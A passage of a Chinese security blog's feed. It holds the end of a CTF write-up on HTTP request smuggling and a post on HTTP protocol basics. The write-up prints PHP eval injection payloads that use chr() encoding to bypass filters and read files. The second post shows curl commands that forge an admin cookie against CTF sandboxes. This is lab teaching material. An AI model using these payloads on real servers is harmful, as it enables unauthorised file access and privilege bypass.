class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在phpifo页面中发现禁用了一些函数和字符，所以尝试绕过，可以利用请求走私。</p><p>利用CL-CL漏洞，返回400错误,同时可以看到phpinfo页面<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191236-584099.png" alt="CL-CL-phpinfo"><br><code>getcwd()</code>:获取到当前工作目录/var/www/html<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191456-261196.png" alt="getcwd"><br><code>var_dump(scandir(dirname(__FILE__)))</code>：获取当前目录下的文件<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191607-151742.png" alt="dir"><br><code>print_r(scandir(chr(47)))</code>：扫描根目录<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191701-2570.png" alt="ls"><br><code>var_dump(readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code>：读取flag<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/191814-959740.png" alt="flag"><br>同样利用CL-TE漏洞同样可以读取flag<br><img src="https://gitee.com/atkx/blog-img/raw/master/image/202104/17/192008-795497.png" alt="cl-te"></p><h2 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><p>在前端服务器通过同一网络连接将多个请求转发到后端服务器的情况下，会出现HTTP请求走私漏洞，并且后端连接所使用的协议会带来两个服务器不同意边界的风险。要求。防止HTTP请求走私漏洞的一些通用方法如下：</p><ul><li>禁用后端连接的重用，以便每个后端请求通过单独的网络连接发送。</li><li>使用HTTP / 2进行后端连接，因为此协议可防止对请求之间的边界产生歧义。</li><li>前端服务器和后端服务器使用完全相同的Web服务器软件，以便它们就请求之间的界限达成一致。</li></ul><p>在某些情况下，可以通过使前端服务器规范歧义请求或使后端服务器拒绝歧义请求并关闭网络连接来避免漏洞。但是，这些方法比上面确定的通用缓解措施更容易出错。</p><p>参考文章：<br><a href="https://paper.seebug.org/1048">https://paper.seebug.org/1048</a><br><a href="https://portswigger.net/web-security/request-smuggling">https://portswigger.net/web-security/request-smuggling</a><br><a href="https://portswigger.net/web-security/request-smuggling/exploiting">https://portswigger.net/web-security/request-smuggling/exploiting</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：HTTP请求走私漏洞学习&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="WEB" scheme="https://swhat.github.io/categories/CTF/WEB/"/>
    
    
    <category term="漏洞复现" scheme="https://swhat.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>HTTP协议</title>
    <link href="https://swhat.github.io/2021/04/11/HTTP%E5%8D%8F%E8%AE%AE/"/>
    <id>https://swhat.github.io/2021/04/11/HTTP%E5%8D%8F%E8%AE%AE/</id>
    <published>2021-04-11T06:30:15.000Z</published>
    <updated>2021-08-15T03:59:06.547Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：深入学习HTTP协议</p> <a id="more"></a><h1 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h1><h2 id="HTTP协议简介"><a href="#HTTP协议简介" class="headerlink" title="HTTP协议简介"></a>HTTP协议简介</h2><p>超文本传输协议 (HTTP-Hypertext transfer protocol) 是一种详细规定了浏览器和万维网服务器之间互相通信的规则，通过因特网传送万维网文档的数据传送协议。通常，由HTTP客户端发起一个请求，建立一个到服务器指定端口（默认是80端口）的TCP连接。HTTP服务器则在那个端口监听客户端发送过来的请求。一旦收到请求，服务器（向客户端）发回一个状态行，比如”HTTP/1.1 200 OK”，和（响应的）消息，消息的消息体可能是请求的文件、错误消息、或者其它一些信息。HTTP使用TCP而不是UDP的原因在于（打开一个）一个网页必须传送很多数据，而TCP协议提供传输控制，按顺序组织数据，和错误纠正。</p><p>从层次的角度看，HTTP是面向事务的(transaction-oriented)应用层协议，它是万维网上能够可靠地交换文件(包括文本、声音、图像等各种多媒体文件)的重要基础。</p><p>交互过程如下：<br><img src="https://img-blog.csdnimg.cn/20210329204302530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>http协议思维导图<br><img src="https://img-blog.csdnimg.cn/20210409104101378.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="HTTP协议特点"><a href="#HTTP协议特点" class="headerlink" title="HTTP协议特点"></a>HTTP协议特点</h2><p>1.基于请求/响应模型的协议。</p><ul><li>请求和响应必须成对，先有请求后有响应</li></ul><p>2.简单快速</p><ul><li>客户向服务器请求服务时，只需传送请求方法和路径。请求方法常用的有GET、HEAD、POST。每种方法规定了客户与服务器联系的类型不同。由于HTTP协议简单，使得HTTP服务器的程序规模小，因而通信速度很快。</li></ul><p>3.灵活</p><ul><li>HTTP允许传输任意类型的数据对象。正在传输的类型由Content-Type加以标记。</li></ul><p>4.无连接</p><ul><li>每次请求一次，释放一次连接。所以无连接表示每次连接只能处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。</li></ul><p>5.无状态</p><ul><li>HTTP协议是无状态协议。无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。</li></ul><h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p>HTTP是基于客户/服务器模式，且面向连接的。典型的HTTP事务处理有如下的过程分为四步：<br>（1）客户与服务器建立连接<br>　　首先客户机与服务器需要建立连接。只要单击某个超级链接，HTTP的工作就开始了。<br>（2）客户向服务器提出请求<br>　　建立连接后，客户机发送一个请求给服务器，请求方式的格式为：统一资源标识符（URL）、协议版本号，后边是MIME信息包括请求修饰符、客户机信息和可能的内容。<br>（3）服务器接受请求，并根据请求返回相应的文件作为应答<br>　　服务器接到请求后，给予相应的响应信息，其格式为一个状态行，包括信息的协议版本号、一个成功或错误的代码，后边是MIME信息包括服务器信息、实体信息和可能的内容。<br>（4）客户与服务器关闭连接<br>　　 客户端接收服务器所返回的信息通过浏览器显示在用户的显示屏上，然后客户机与服务器断开连接。</p><p>　　如果在以上过程中的某一步出现错误，那么产生错误的信息将返回到客户端。　　</p><h2 id="HTTP协议发展史"><a href="#HTTP协议发展史" class="headerlink" title="HTTP协议发展史"></a>HTTP协议发展史</h2><h3 id="HTTP-0-9"><a href="#HTTP-0-9" class="headerlink" title="HTTP/0.9"></a>HTTP/0.9</h3><p>0.9版本是第一个定稿的HTTP版本，相对较为简陋。它有以下特点：</p><ul><li><p>只接受 GET 一种请求方法</p></li><li><p>没有header等描述数据的信息</p></li><li><p>服务器发送完毕，就关闭TCP连接</p></li></ul><p>由于该版本不支持 POST 方法，所以客户端无法向服务器传递太多信息</p><h3 id="HTTP-1-0"><a href="#HTTP-1-0" class="headerlink" title="HTTP/1.0"></a>HTTP/1.0</h3><p>1.0版本在0.9版本上做出了很多创新和优化，该版本：</p><ul><li><p>增加了新的命令（POST命令和HEADER命令）</p></li><li><p>增加status code（状态码）和header</p></li><li><p>增加多字符集支持、多部分发送、authorization（权限）、cache（缓存）等</p></li></ul><p>这是第一个在通讯中指定版本号的HTTP 协议版本，在这个版本，基本实现了HTTP协议的框架。</p><h3 id="HTTP-1-1"><a href="#HTTP-1-1" class="headerlink" title="HTTP/1.1"></a>HTTP/1.1</h3><p>1.1版本解决了大量1.0版本的痛点，该版本新增了以下功能：</p><ul><li><p>持久连接（keep alive）</p></li><li><p>管道化（pipeline）</p></li><li><p>host和其他一些命令</p></li></ul><h3 id="HTTP-2-0"><a href="#HTTP-2-0" class="headerlink" title="HTTP/2.0"></a>HTTP/2.0</h3><p>HTTP2.0的前身是HTTP1.0和HTTP1.1,是HTTP 协议的第二个主要版本，该版本关注于减少延迟时间，从而提高页面加载速度。HTTP/2 是基于 SPDY 协议的，打开一个 TCP 连接并重复使用，这使得许多请求得以并行发送，而无需等待响应。</p><p>HTTP/2.0优势是:</p><ul><li><p>所有数据二进制传输</p></li><li><p>同一链接多个请求不再按照顺序来</p></li><li><p>头信息压缩以及推送等提高效率的功能</p></li></ul><h1 id="HTTP报文格式"><a href="#HTTP报文格式" class="headerlink" title="HTTP报文格式"></a>HTTP报文格式</h1><p>用于HTTP协议交互的信息被称为报文。</p><p>请求端（客户端）的HTTP报文叫做请求报文，响应端（服务器端）的叫做响应报文。HTTP报文本身是由多行数据构成的字符串文本。HTTP报文大致上可分为报文首部和报文主体两块，两者由最初出现的空行来划分。<br>通常来说，并不一定要有报文主体。</p><p>HTTP报文由三部分组成：</p><p>（1)起始行：<br>报文的第一行就是起始行,用于区分是请求报文还是响应报文，请求报文中开始行叫做请求行，而响应报文中，开始行叫做状态行。在开始行的三个字段之间都用空格分开，结尾处 CRLF 表示回车和换行。</p><p>（2)首部行：<br>起始行后面有零个或多个字段。每个字段都包含一个名字和一个值,为了便于解析,两者之间用冒号(:)来分隔，首部以一个空行结束。<br>用于说明浏览器、服务器或报文主体的一些信息。在每一个首部行中都有首部字段名和它的值，每一行在结束的地方都要有“回车”和“换行”。整个首部行结束时，还有以空行将首部行和后面的实体分开。</p><p>（3)主体：<br>空行之后就是可选的报文主体了，其中包含了所有类型的数据。请求主体是要发送给服务器的数据;响应主体是要返回给客户端的数据。在请求报文中一般不用这个字段，而在响应报文中也可能没有这个字段。</p><h2 id="Request请求报文"><a href="#Request请求报文" class="headerlink" title="Request请求报文"></a>Request请求报文</h2><blockquote><p>  HTTP请求报文——从客户向服务器发送请求报文</p></blockquote><p>  HTTP的请求报文由三部分组成 : 请求行 , 首部行和实体 , 如下图 :<br><img src="https://img-blog.csdnimg.cn/20210328202511308.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>请求行：请求行由请求方法字段、URL字段和HTTP协议版本字段3个字段组成，它们用空格分隔。比如 GET /data/info.html HTTP/1.1。方法字段就是HTTP使用的请求方法，比如常见的GET/POST</li><li>请求头：浏览器向服务器发送请求的时候必须指明请求类型(一般是GET或者 POST)。如有必要，客户程序还可以选择发送其他的请求头。大多数请求头并不是必需的，但Content-Length除外。对于POST请求来说 Content-Length必须出现。</li><li>实体：若方法字段是GET，则此项为空，没有数据。若方法字段是POST,则通常来说此处放置的就是要提交的数据</li></ul><h3 id="请求报文实例"><a href="#请求报文实例" class="headerlink" title="请求报文实例"></a>请求报文实例</h3><p>抓包本地搭建的登陆页面，得到请求头：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /<span class="hljs-built_in">test</span>/login.html HTTP/1.1        <span class="hljs-comment">#请求方法为POST，请求URL为/test/login.html，HTTP协议版本为HTTP/1.1</span><br>Host: 127.0.0.1<span class="hljs-comment">#客户机通过这个头告诉服务器，想访问的主机名</span><br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0  <span class="hljs-comment">#指定用户代理服务器的类型。</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2   <span class="hljs-comment">#指出客户浏览器支持的语言是英语（english）</span><br>Accept-Encoding: gzip, deflate        <span class="hljs-comment">#指出发送此请求的浏览器支持哪些压缩编码方式。</span><br>Content-Type: application/x-www-form-urlencoded      <span class="hljs-comment">#表示后面的文档属于什么MIME类型</span><br>Content-Length: 26 <span class="hljs-comment">#表示内容长度</span><br>Origin: http://127.0.0.1     <span class="hljs-comment">#Origin主要是用来说明最初请求是从哪里发起的；</span><br>Connection: close         <span class="hljs-comment">#是在告知服务器本浏览器不想使用永久连接方式（HTTP/1.0使用非永久连接，HTTP/1.1默认使用永久连接）。</span><br>Referer: http://127.0.0.1/<span class="hljs-built_in">test</span>/index.html   <span class="hljs-comment">#客户机通过这个头告诉服务器，它是从哪个资源来访问服务器的</span><br>Cookie: _ga=GA1.1.1592130974.1616653076; bdshare_firstime=1616653211943       <span class="hljs-comment">#客户机通过这个头可以向服务器带数据</span><br>Upgrade-Insecure-Requests: 1        <span class="hljs-comment">#表示能读懂服务器发过来的上面这条信息</span><br><br>username=<span class="hljs-built_in">test</span>&amp;password=123     <span class="hljs-comment">#请求数据</span><br></code></pre></td></tr></table></figure><h3 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h3><p>方法字段指出客户请求服务器执行的一般操作。HTTP/1.1中定义了八种请求方法，其中GET、POST、HEAD、是常用请求方法。</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>GET</td><td>获取一个URL指定的资源,即资源实体。</td></tr><tr><td>POST</td><td>传输实体主体,向服务器提交数据。</td></tr><tr><td>HEAD</td><td>获取一个指定资源的信息,类似GET方法，区别在于只返回报文首部，不返回报文主体。</td></tr><tr><td>PUT</td><td>向服务器提交资源,用来传输文件。</td></tr><tr><td>DELETE</td><td>请求源服务器删除Request-URI标识的资源,用来删除文件。</td></tr><tr><td>TRACE</td><td>网络跟踪</td></tr><tr><td>CONNECT</td><td>与PROXY之间的连接管理,要求用隧道协议连接代理。</td></tr><tr><td>OPTIONS</td><td>查询能力,询问支持方法返回服务器支持的方法。</td></tr></tbody></table><p><strong>GET和POST之间的区别</strong></p><p>1、GET方法的数据参数是暴露在起始行的URL中的，而POST方法的数据参数是在报文主体中的。<br>2、GET方法相对来说没有POST安全，因为它的数据参数可以直接从URL中获取，但是GET的效率更高。<br>3、GET方法的数据参数大小有一定的限制（1024）（原因也是因为它的数据参数是放在URL中的），而POST对数据大小是没有限制的。<br>其实他们的本质区别是GET是从服务器上请求数据，而POST是向服务器发送数据</p><h3 id="请求报文属性"><a href="#请求报文属性" class="headerlink" title="请求报文属性"></a>请求报文属性</h3><p>请求头部为请求报文添加了一些附加信息，由“名/值”对组成，每行一对，名和值之间使用冒号分隔</p><p>常见请求头如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">Client-IP：提供了运行客户端的机器的IP地址<br><br>From：提供了客户端用户的E-mail地址<br><br>Host：给出了接收请求的服务器的主机名和端口号<br><br>Referer：提供了包含当前请求URI的文档的URL，服务器能知道你是从哪个页面过来的<br><br>UA-Color：提供了与客户端显示器的显示颜色有关的信息<br><br>UA-CPU：给出了客户端CPU的类型或制造商<br><br>UA-OS：给出了运行在客户端机器上的操作系统名称及版本<br><br>User-Agent：将发起请求的应用程序名称告知服务器 <br>      <br>Accept：告诉服务器能够发送哪些媒体类型<br><br>Accept-Charset：告诉服务器能够发送哪些字符集<br><br>Accept-Encoding：告诉服务器能够发送哪些编码方式<br><br>Accept-Language：告诉服务器能够发送哪些语言<br><br>TE：告诉服务器可以使用那些扩展传输编码<br><br>Expect：允许客户端列出某请求所要求的服务器行为<br><br>Range：如果服务器支持范围请求，就请求资源的指定范围<br><br>Cookie：客户端用它向服务器传送数据<br><br>Cookie2：用来说明请求端支持的cookie版本<br><br>Upgrade-Insecure-Requests：表示能读懂服务器发过来的上面这条信息，并且在以后发请求的时候不用http而用https<br></code></pre></td></tr></table></figure><h2 id="Response响应报文"><a href="#Response响应报文" class="headerlink" title="Response响应报文"></a>Response响应报文</h2><blockquote><p>  HTTP响应报文——从服务器到客户的回答</p></blockquote><p>   HTTP的请求报文由三部分组成 : 状态行 、 首部行和实体 , 如下图 :<br><img src="https://img-blog.csdnimg.cn/20210328202534215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>响应行：响应行一般由协议版本、状态码及其描述组成 比如 HTTP/1.1 200 OK。其中协议版本HTTP/1.1或者HTTP/1.0，200就是它的状态码，OK则为它的描述。</li><li>响应头：响应头用于描述服务器的基本信息，以及数据的描述，服务器通过这些数据的描述信息，可以通知客户端如何处理等一会儿它回送的数据。</li><li>响应体：响应体就是响应的消息体，如果是纯数据就是返回纯数据，如果请求的是HTML页面，那么返回的就是HTML代码，如果是JS就是JS代码，如此之类。<h3 id="响应报文实例"><a href="#响应报文实例" class="headerlink" title="响应报文实例"></a>响应报文实例</h3>抓包本地搭建的登陆页面，得到响应头：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">HTTP/1.1 200 OK   <span class="hljs-comment">#HTTP协议及版本 状态码</span><br>Date: Mon, 29 Mar 2021 02:57:52 GMT  <span class="hljs-comment">#服务器创建并发送本响应消息的日期和时间。</span><br>Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45  <span class="hljs-comment">#服务器和版本号</span><br>Last-Modified: Mon, 29 Mar 2021 02:57:07 GMT  <span class="hljs-comment">#对象本身的创建或最后修改日期或时间</span><br>ETag: <span class="hljs-string">&quot;8e-5bea4098d63cb&quot;</span>   <span class="hljs-comment">#缓存相关的头</span><br>Accept-Ranges: bytes  <span class="hljs-comment">#标识自身支持范围请求(partial requests)</span><br>Content-Length: 142  <span class="hljs-comment">#所发送对象的字节数</span><br>Connection: close    <span class="hljs-comment">#处理完这次请求后是否断开连接还是继续保持连接</span><br>Content-Type: text/html  <span class="hljs-comment">#包含在实体中的对象是HTML文本</span><br><br>&lt;!DOCTYPE html&gt;    <span class="hljs-comment">#实体部分</span><br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>    &lt;title&gt;succsss&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>Login succsss!!!<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><h3 id="响应状态码"><a href="#响应状态码" class="headerlink" title="响应状态码"></a>响应状态码</h3><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status">HTTP 响应代码</a>，状态代码由服务器发出，以响应客户端对服务器的请求。</p><p>请求报文的方法字段是对所请求对象进行的操作，而响应报文的状态码是一个 3 位数字，可以分为以下 5 类 ：</p><table><thead><tr><th>状态码类别</th><th>描述</th></tr></thead><tbody><tr><td>1xx</td><td>收到请求，继续处理。</td></tr><tr><td>2xx</td><td>请求已成功接收，理解和接受</td></tr><tr><td>3xx</td><td>重定向到其它地方</td></tr><tr><td>4xx</td><td>客户的差错，请求包含错误的语法或无法满足。</td></tr><tr><td>5xx</td><td>服务器的差错，服务器无法满足明显有效的请求</td></tr></tbody></table><p>常见的状态码：</p><table><thead><tr><th>状态码</th><th>描述</th><th>说明</th></tr></thead><tbody><tr><td>200</td><td>OK</td><td>表示从客户端发送给服务器的请求被正常处理并返回</td></tr><tr><td>204</td><td>No Content</td><td>表示客户端发送给客户端的请求得到了成功处理，但在返回的响应报文中不含实体的主体部分</td></tr><tr><td>301</td><td>Moved Permanently</td><td>永久重定向，表示请求的资源被分配了新的URL，之后应使用更改的URL。</td></tr><tr><td>302</td><td>Found</td><td>临时重定向，表示请求的资源被分配了新的URL，希望本次访问使用新的URL。</td></tr><tr><td>304</td><td>Not Modified</td><td>缓存文件并未过期，还可继续使用，无需再次从服务端获取</td></tr><tr><td>400</td><td>Bad Request</td><td>客户端请求有语法错误，不能被服务器识别</td></tr><tr><td>401</td><td>Unauthorized</td><td>未经许可，需要通过HTTP认证</td></tr><tr><td>403</td><td>Forbidden</td><td>服务器接收到请求，但是拒绝提供服务。</td></tr><tr><td>404</td><td>Not Found</td><td>请求资源不存在</td></tr><tr><td>500</td><td>Internal Server Error</td><td>服务器内部错误</td></tr><tr><td>503</td><td>Server Unavailable</td><td>服务器暂时不能处理客户端的请求</td></tr></tbody></table><h3 id="响应报文属性"><a href="#响应报文属性" class="headerlink" title="响应报文属性"></a>响应报文属性</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs xml">Age：(从最初创建开始)响应持续时间<br><br>Public：服务器为其资源支持的请求方法列表<br><br>Retry-After：如果资源不可用的话，在此日期或时间重试<br><br>Server：服务器应用程序软件的名称和版本<br><br>Title：对HTML文档来说，就是HTML文档的源端给出的标题<br><br>Warning：比原因短语更详细一些的警告报文<br><br>ETag：一个代表响应服务端资源（如页面）版本的报文头属性，如果某个服务端资源发生变化了，这个ETag就会相应发生变化。<br><br>Accept-Ranges：对此资源来说，服务器可接受的范围类型<br><br>Vary：服务器会根据这些首部的内容挑选出最适合的资源版本发送给客户端<br><br>Proxy-Authenticate：来自代理的对客户端的质询列表<br><br>Set-Cookie：服务端可以设置客户端的Cookie，以便服务器对客户端进行标识。<br><br>Set-Cookie2：与Set-Cookie类似<br><br>WWW-Authenticate：来自服务器的对客户端的质询列表<br><br></code></pre></td></tr></table></figure><h1 id="HTTP协议实战练习"><a href="#HTTP协议实战练习" class="headerlink" title="HTTP协议实战练习"></a>HTTP协议实战练习</h1><p>题目来自CTFhub靶场：Web前置技能-HTTP协议</p><h2 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h2><p>HTTP 请求方法, HTTP/1.1协议中共定义了八种方法（也叫动作）来以不同方式操作指定的资源。</p><p><img src="https://img-blog.csdnimg.cn/20210329161254214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>方法一：<br>burpsite抓包，自定义CTFHUB方法请求 index.php 即可拿到 flag。<br><img src="https://img-blog.csdnimg.cn/20210329161305347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>方法二：<br>使用curl命令查看服务器的返回信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -v -X CTFHUB challenge-9661cba9e188a4c8.sandbox.ctfhub.com:10080/index.php<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210329162918897.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h2><p>HTTP临时重定向<br><img src="https://img-blog.csdnimg.cn/20210329202651177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>点击超链接无反应，查看源码发现了index.php，而此时url栏是index.html<br><img src="https://img-blog.csdnimg.cn/20210329202712652.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>burpsite抓包，在响应包得到flag<br><img src="https://img-blog.csdnimg.cn/20210329202803184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>方法二：<br>curl命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -i http://challenge-f6959bd27c1b2b09.sandbox.ctfhub.com:10080/index.php<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210329161745105.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl命令<br>https://blog.csdn.net/qq_45738111/article/details/105265455<br></code></pre></td></tr></table></figure><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>Cookie欺骗、认证、伪造</p><p><a href="http://challenge-67f523772f2e5d91.sandbox.ctfhub.com:10080/">http://challenge-67f523772f2e5d91.sandbox.ctfhub.com:10080</a><br>方法一：</p><p>抓包，响应头提示只有admin才能得到flag，此时请求头Cookie的值为admin=0<br><img src="https://img-blog.csdnimg.cn/20210329200457714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>改为admin=1，得到flag<br><img src="https://img-blog.csdnimg.cn/20210329200506541.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>方法二：</p><p>可以使用curl命令的”-H”参数来为http请求头添加cookie键值来发送cookie：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -i -H <span class="hljs-string">&quot;Cookie:admin=1&quot;</span> http://challenge-67f523772f2e5d91.sandbox.ctfhub.com:10080/<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210329191357125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="基础认证"><a href="#基础认证" class="headerlink" title="基础认证"></a>基础认证</h2><p>在HTTP中，基本认证（英语：Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。详情请查看 <a href="https://zh.wikipedia.org/wiki/HTTP%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81">https://zh.wikipedia.org/wiki/HTTP基本认证</a></p><p>访问题目地址<br><img 